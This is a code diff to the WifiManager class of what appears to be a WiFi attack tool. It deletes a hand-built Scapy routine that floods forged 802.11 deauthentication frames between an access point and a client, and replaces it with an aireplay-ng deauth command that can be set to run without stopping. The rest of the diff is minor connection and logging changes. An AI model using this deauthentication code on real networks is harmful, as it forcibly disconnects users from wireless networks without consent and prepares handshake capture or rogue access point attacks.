@@ -88,7 +88,7 @@ class WifiManager:
     # =======================
 
     def __set_channel(self, channel):
-        disp.debug("Changing channel to", str(channel))
+        disp.debug("Changing channel to", str(channel), "for card", self.card.dev)
         pyw.chset(self.card, channel)
 
 
@@ -222,45 +222,22 @@ class WifiManager:
     #    Client management
     # =======================
 
-    def deauth_client(self, client, ap, use_aireplay=True):
+    def deauth_client(self, client, ap, dont_stop=False):
         self.__check_mode(MODE_MON)
         self.__set_channel(ap.chan)
 
-        if use_aireplay:
-            # Send deauth with aireplay
-            do("aireplay-ng -0 5 -a", ap.bssid, "-c", client.mac, self.card.dev)
-
-        else:
-            # Build deauth packets: addr1=dst, addr2=src, addr3=bssid
-            deauth_client = RadioTap() \
-                    / Dot11(addr1=ap.bssid, addr2=client.mac, addr3=ap.bssid) \
-                    / Dot11Deauth(reason=7)
-
-            deauth_ap = RadioTap() \
-                    / Dot11(addr2=ap.bssid, addr1=client.mac, addr3=ap.bssid) \
-                    / Dot11Deauth(reason=7)
-
-            # Send packets, updating sequence number
-            pkt_count = 3*64*2
-            for i in range(0, pkt_count, 2):
-                deauth_client.SC = i << 4
-                deauth_ap.SC     = (i + 1) << 4
-
-                sendp(deauth_client, iface=self.card.dev, verbose=False)
-                sendp(deauth_ap,     iface=self.card.dev, verbose=False)
-
-                if disp.Verb.isdebug():
-                    print('.', end="", flush=True)
-
-            if disp.Verb.isdebug():
-                print()
-            disp.debug("Sent", str(pkt_count), "deauth packets")
+        # Send deauth with aireplay
+        do("aireplay-ng",
+                "-0", '0' if dont_stop else '5',
+                "-a", ap.bssid,
+                "-c", client.mac,
+                self.card.dev)
 
 
     def connect_access_point(self, ap, force=True):
         self.__check_mode(MODE_MAN)
 
-        while not pyw.isconnected(self.card):
+        while not pyw.link(self.card):
             try:
                 pyw.connect(self.card, ap.ssid.encode(), bssid=ap.bssid)
                 time.sleep(1)
@@ -273,7 +250,7 @@ class WifiManager:
     def acquire_ip(self):
         self.__check_mode(MODE_MAN)
 
-        if not pyw.isconnected(self.card):
+        if pyw.link(self.card) == None:
             disp.error("Can't acquire IP using DHCP: wireless card not connected to AP!")
             return False
         else:
